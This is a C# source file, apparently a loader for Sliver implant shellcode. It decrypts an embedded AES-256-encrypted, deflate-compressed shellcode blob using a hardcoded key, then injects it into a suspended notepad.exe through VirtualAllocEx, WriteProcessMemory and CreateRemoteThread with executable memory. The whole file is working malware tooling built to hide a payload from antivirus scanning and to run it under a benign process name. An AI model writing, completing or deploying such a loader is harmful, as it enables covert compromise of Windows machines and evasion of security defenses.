using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.IO.Compression;

namespace Sl1verLoader
{
    public class Program
    {
        [StructLayout(LayoutKind.Sequential)]
        public class SecurityAttributes
        {
            public Int32 Length = 0;
            public IntPtr lpSecurityDescriptor = IntPtr.Zero;
            public bool bInheritHandle = false;

            public SecurityAttributes()
            {
                this.Length = Marshal.SizeOf(this);
            }
        }
        [StructLayout(LayoutKind.Sequential)]
        public struct ProcessInformation
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public Int32 dwProcessId;
            public Int32 dwThreadId;
        }
        [Flags]
        public enum CreateProcessFlags : uint
        {
            DEBUG_PROCESS = 0x00000001,
            DEBUG_ONLY_THIS_PROCESS = 0x00000002,
            CREATE_SUSPENDED = 0x00000004,
            DETACHED_PROCESS = 0x00000008,
            CREATE_NEW_CONSOLE = 0x00000010,
            NORMAL_PRIORITY_CLASS = 0x00000020,
            IDLE_PRIORITY_CLASS = 0x00000040,
            HIGH_PRIORITY_CLASS = 0x00000080,
            REALTIME_PRIORITY_CLASS = 0x00000100,
            CREATE_NEW_PROCESS_GROUP = 0x00000200,
            CREATE_UNICODE_ENVIRONMENT = 0x00000400,
            CREATE_SEPARATE_WOW_VDM = 0x00000800,
            CREATE_SHARED_WOW_VDM = 0x00001000,
            CREATE_FORCEDOS = 0x00002000,
            BELOW_NORMAL_PRIORITY_CLASS = 0x00004000,
            ABOVE_NORMAL_PRIORITY_CLASS = 0x00008000,
            INHERIT_PARENT_AFFINITY = 0x00010000,
            INHERIT_CALLER_PRIORITY = 0x00020000,
            CREATE_PROTECTED_PROCESS = 0x00040000,
            EXTENDED_STARTUPINFO_PRESENT = 0x00080000,
            PROCESS_MODE_BACKGROUND_BEGIN = 0x00100000,
            PROCESS_MODE_BACKGROUND_END = 0x00200000,
            CREATE_BREAKAWAY_FROM_JOB = 0x01000000,
            CREATE_PRESERVE_CODE_AUTHZ_LEVEL = 0x02000000,
            CREATE_DEFAULT_ERROR_MODE = 0x04000000,
            CREATE_NO_WINDOW = 0x08000000,
            PROFILE_USER = 0x10000000,
            PROFILE_KERNEL = 0x20000000,
            PROFILE_SERVER = 0x40000000,
            CREATE_IGNORE_SYSTEM_DEFAULT = 0x80000000,
        }


        [StructLayout(LayoutKind.Sequential)]
        public class StartupInfo
        {
            public Int32 cb = 0;
            public IntPtr lpReserved = IntPtr.Zero;
            public IntPtr lpDesktop = IntPtr.Zero;
            public IntPtr lpTitle = IntPtr.Zero;
            public Int32 dwX = 0;
            public Int32 dwY = 0;
            public Int32 dwXSize = 0;
            public Int32 dwYSize = 0;
            public Int32 dwXCountChars = 0;
            public Int32 dwYCountChars = 0;
            public Int32 dwFillAttribute = 0;
            public Int32 dwFlags = 0;
            public Int16 wShowWindow = 0;
            public Int16 cbReserved2 = 0;
            public IntPtr lpReserved2 = IntPtr.Zero;
            public IntPtr hStdInput = IntPtr.Zero;
            public IntPtr hStdOutput = IntPtr.Zero;
            public IntPtr hStdError = IntPtr.Zero;
            public StartupInfo()
            {
                this.cb = Marshal.SizeOf(this);
            }
        }
        [DllImport("kernel32.dll")]
        public static extern IntPtr CreateProcessA(String lpApplicationName, String lpCommandLine, SecurityAttributes lpProcessAttributes, SecurityAttributes lpThreadAttributes, Boolean bInheritHandles, CreateProcessFlags dwCreationFlags, IntPtr lpEnvironment, String lpCurrentDirectory, [In] StartupInfo lpStartupInfo, out ProcessInformation lpProcessInformation);

        [DllImport("kernel32.dll")]
        public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, Int32 dwSize, UInt32 flAllocationType, UInt32 flProtect);

        [DllImport("kernel32.dll")]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] buffer, IntPtr dwSize, out int lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);


        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
        private static UInt32 MEM_COMMIT = 0x1000;

        public static void Main()
        {
            // Hardcoded payload, no network stage. The first 16 bytes of
            // EncryptedShellcode are the AES IV (matches payload.bin).
            if (Payload.EncryptedShellcode.Length < 17 || Payload.AESKey.Length != 32)
                return;

            byte[] iv = Payload.EncryptedShellcode.Take(16).ToArray();
            byte[] ciphertext = Payload.EncryptedShellcode.Skip(16).ToArray();

            byte[] compressed = Decrypt(ciphertext, Payload.AESKey, iv);
            byte[] sc = Decompress(compressed, Payload.CompressionAlgorithm);

            Inject(sc, Payload.TargetBinary);
        }

        public static void Inject(byte[] sc, string TargetBinary)
        {
            Int32 size = sc.Length;
            StartupInfo sInfo = new StartupInfo();
            sInfo.dwFlags = 0;
            ProcessInformation pInfo;
            string binaryPath = "C:\\Windows\\System32\\" + TargetBinary;
            IntPtr funcAddr = CreateProcessA(binaryPath, null, null, null, true, CreateProcessFlags.CREATE_SUSPENDED, IntPtr.Zero, null, sInfo, out pInfo);
            IntPtr hProcess = pInfo.hProcess;
            IntPtr spaceAddr = VirtualAllocEx(hProcess, new IntPtr(0), size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

            IntPtr size2 = new IntPtr(sc.Length);
            bool bWrite = WriteProcessMemory(hProcess, spaceAddr, sc, size2, out int bytesWritten);
            CreateRemoteThread(hProcess, new IntPtr(0), new uint(), spaceAddr, new IntPtr(0), new uint(), new IntPtr(0));
            return;
        }

        public static byte[] Decompress(byte[] data, string CompressionAlgorithm)
        {
            byte[] decompressedArray = null;
            if (CompressionAlgorithm == "deflate9")
            {
                using (MemoryStream decompressedStream = new MemoryStream())
                {
                    using (MemoryStream compressStream = new MemoryStream(data))
                    {
                        using (DeflateStream deflateStream = new DeflateStream(compressStream, CompressionMode.Decompress))
                        {
                            deflateStream.CopyTo(decompressedStream);
                        }
                    }
                    decompressedArray = decompressedStream.ToArray();
                }
                return decompressedArray;
            }
            else if (CompressionAlgorithm == "gzip")
            {
                using (MemoryStream decompressedStream = new MemoryStream())
                {
                    using (MemoryStream compressStream = new MemoryStream(data))
                    {
                        using (GZipStream gzipStream = new GZipStream(compressStream, CompressionMode.Decompress))
                        {
                            gzipStream.CopyTo(decompressedStream);
                        }
                    }
                    decompressedArray = decompressedStream.ToArray();
                }
                return decompressedArray;
            }
            else
            {
                // "none": AES-CBC always pads to a 16-byte boundary (PKCS7), strip it
                int padLen = data[data.Length - 1];
                if (padLen > 0 && padLen <= 16 && data.Length >= padLen
                    && data.Skip(data.Length - padLen).All(b => b == padLen))
                    return data.Take(data.Length - padLen).ToArray();
                return data;
            }
        }

        // AES-256-CBC, PKCS7 padding (matches encryptor.py)
        public static byte[] Decrypt(byte[] ciphertext, byte[] AESKey, byte[] AESIV)
        {
            using (Aes aesAlg = Aes.Create())
            {
                aesAlg.Key = AESKey;
                aesAlg.IV = AESIV;
                aesAlg.Mode = CipherMode.CBC;
                aesAlg.Padding = PaddingMode.PKCS7;

                ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);

                using (MemoryStream memoryStream = new MemoryStream())
                {
                    using (CryptoStream cryptoStream = new CryptoStream(memoryStream, decryptor, CryptoStreamMode.Write))
                    {
                        cryptoStream.Write(ciphertext, 0, ciphertext.Length);
                    }
                    return memoryStream.ToArray();
                }
            }
        }
    }


    // =====================================================================
    // GENERATED SECTION
    // Replace the four members below with the contents of payload.cs
    // produced by encryptor.py (or delete this class and add payload.cs
    // to the project as its own file).
    // =====================================================================
    public static class Payload
    {
        public static byte[] EncryptedShellcode = new byte[]
        {
            0x1b, 0xc5, 0x84, 0xd8, 0x1c, 0xcc, 0xa8, 0x9a, 0xdc, 0x7b, 0x98, 0x48, 0x28, 0x23, 0x95, 0xd4,
            0x7e, 0xab, 0x67, 0xa8, 0xe8, 0x95, 0x7b, 0x94, 0xd5, 0x3c, 0x9d, 0x37, 0x3e, 0x14, 0x61, 0xd8,
            0x1b, 0x0e, 0xa7, 0x8e, 0x26, 0x86, 0x24, 0xc2, 0x19, 0xcc, 0xa3, 0x46, 0xaf, 0xf4, 0x44, 0x26,
            0xf5, 0x04, 0xa5, 0xcd, 0x17, 0x9b, 0xa0, 0x84, 0x7f, 0xa0, 0x1f, 0x00, 0x76, 0x3e, 0x01, 0xfb,
            0x29, 0xe7, 0x75, 0xad, 0xfc, 0x51, 0xfe, 0x07, 0xbd, 0x75, 0x59, 0x87, 0xd8, 0xc1, 0x68, 0xf3,
            0x2b, 0xb7, 0x77, 0xf3, 0x75, 0x45, 0x83, 0x38, 0xb1, 0xcd, 0xc9, 0xb6, 0xfa, 0x8a, 0x13, 0x8a,
            0x4d, 0xfe, 0x0f, 0xa7, 0x49, 0x10, 0xfa, 0x1e, 0x75, 0x7c, 0xfd, 0xf5, 0xe8, 0x0e, 0x69, 0xb1,
            0x33, 0x58, 0x44, 0x50, 0xf7, 0x45, 0xec, 0x39, 0x00, 0xab, 0xbe, 0xa8, 0x60, 0x45, 0x01, 0x8e,
            0x78, 0xef, 0x7c, 0xf6, 0xa7, 0x1f, 0x05, 0xf0, 0x18, 0x0f, 0xfa, 0x61, 0x95, 0xc3, 0x1e, 0x96,
            0x56, 0x5a, 0x41, 0x30, 0x7c, 0x18, 0x47, 0xbe, 0xf5, 0xbc, 0x1e, 0x01, 0x2f, 0x69, 0x91, 0xd5,
            0x6f, 0x81, 0x84, 0x30, 0x1b, 0xb8, 0xe1, 0x3f, 0x72, 0x72, 0x13, 0xad, 0xf5, 0x95, 0x63, 0xed,
            0x19, 0xbe, 0x10, 0x96, 0x8c, 0x93, 0xfb, 0x22, 0x31, 0xbb, 0x52, 0xdb, 0xe5, 0x7b, 0x65, 0x6f,
            0xc6, 0x87, 0xbc, 0xa8, 0x2f, 0x92, 0xb1, 0xd1, 0x7e, 0xed, 0x08, 0xb0, 0xf1, 0x6f, 0x36, 0x50,
            0x62, 0x39, 0x86, 0x30, 0x98, 0xc7, 0x70, 0xf6, 0xc7, 0x72, 0xef, 0x8f, 0x49, 0xd0, 0x1b, 0x12,
            0x18, 0xcf, 0x6f, 0x6f, 0xbc, 0x2a, 0xaa, 0x0b, 0x8c, 0x0e, 0xa8, 0x1c, 0xe2, 0xdf, 0x07, 0xa7,
            0x74, 0xa8, 0x65, 0xf3, 0x0f, 0x25, 0x0b, 0xb2, 0x36, 0x0e, 0x38, 0xdb, 0x66, 0x12, 0x6b, 0xa3,
            0xeb, 0xa6, 0x73, 0xf9, 0x07, 0x35, 0x33, 0x59, 0x3f, 0xb2, 0x19, 0xbf, 0x3b, 0xdf, 0x69, 0xcd,
            0xcf, 0x5d, 0xa6, 0x19, 0xe3, 0x94, 0x6f, 0x89, 0x3d, 0x20, 0x19, 0x8b, 0x6d, 0xf8, 0xf0, 0xb3,
            0xa2, 0xb9, 0x65, 0x62, 0xd8, 0x4b, 0xc6, 0x73, 0x09, 0x5b, 0x17, 0x83, 0x75, 0x4d, 0x55, 0x26,
            0xd0, 0x13, 0xa5, 0xd9, 0x18, 0xfd, 0xb8, 0xd5, 0xf4, 0xfb, 0xbf, 0xac, 0x07, 0x96, 0xfc, 0x10,
            0x56, 0x52, 0x52, 0x05, 0x1c, 0xaa, 0x86, 0x7b, 0xbb, 0x84, 0xd2, 0x13, 0x86, 0xd6, 0x2d, 0x8d,
            0x88, 0x10, 0x7c, 0xe3, 0x20, 0xe1, 0x14, 0x8c, 0x04, 0x12, 0xc6, 0x85, 0x85, 0x20, 0x9a, 0xd1,
            0xe6, 0xed, 0xfd, 0xde, 0x25, 0x11, 0xb8, 0xbf, 0xd3, 0x1b, 0x37, 0x58, 0xc9, 0xbc, 0xf8, 0x05,
            0x5c, 0x26, 0x9e, 0x8a, 0x9e, 0x29, 0xa8, 0x2c, 0x25, 0xae, 0xdc, 0x1a, 0x5e, 0xde, 0x44, 0x4c,
            0xce, 0xac, 0xe6, 0xe5, 0x1d, 0xbb, 0x6f, 0x3d, 0x3d, 0x73, 0x58, 0x7b, 0x24, 0x69, 0xb5, 0xac,
            0xdb, 0x47, 0xa6, 0x72, 0x8d, 0x3b, 0x8f, 0xd1, 0xdb, 0x22, 0x4c, 0xbf, 0x0b, 0x3f, 0xf9, 0x7e,
            0x7f, 0x29, 0xca, 0xa4, 0xcd, 0x2c, 0x06, 0x13, 0x46, 0x24, 0x7b, 0xc7, 0xe8, 0xe2, 0xba, 0x8b,
            0x7e, 0xad, 0xec, 0x58, 0x22, 0x78, 0x67, 0x84, 0x9a, 0xe4, 0xcd, 0x08, 0xcd, 0x8c, 0xd1, 0xe9,
            0x3b, 0xf8, 0xae, 0x05, 0x75, 0xd0, 0x49, 0x06, 0x53, 0x81, 0x21, 0xa2, 0xd6, 0x50, 0x19, 0x8e,
            0xad, 0xb2, 0xa0, 0x35, 0x2d, 0xdc, 0xba, 0x3d, 0xcc, 0xd6, 0x10, 0xef, 0x01, 0x5d, 0xc9, 0x6a
    };
    public static byte[] AESKey = new byte[]
    {
        0x6f, 0x67, 0xb1, 0xe5, 0xad, 0xec, 0xbd, 0xee, 0xcc, 0x7e, 0xe5, 0x4d, 0x45, 0x3b, 0xce, 0xc4,
        0x29, 0x0e, 0xf0, 0x2c, 0x9e, 0x30, 0x27, 0x8d, 0x84, 0xd8, 0x3f, 0x4c, 0xc1, 0x25, 0xdb, 0xd0
    };
    public static string CompressionAlgorithm = "deflate9";
    public static string TargetBinary = "notepad.exe";
}